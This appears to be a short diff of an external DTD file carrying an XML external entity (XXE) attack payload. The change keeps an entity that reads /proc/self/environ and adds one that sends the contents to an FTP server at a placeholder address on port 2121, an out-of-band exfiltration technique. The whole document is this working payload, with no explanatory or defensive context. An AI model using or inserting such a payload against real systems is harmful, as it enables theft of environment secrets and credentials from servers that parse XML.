@@ -1,1 +1,2 @@
-<!ENTITY % c SYSTEM "file:///proc/self/environ">
+<!ENTITY % d SYSTEM "file:///proc/self/environ">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
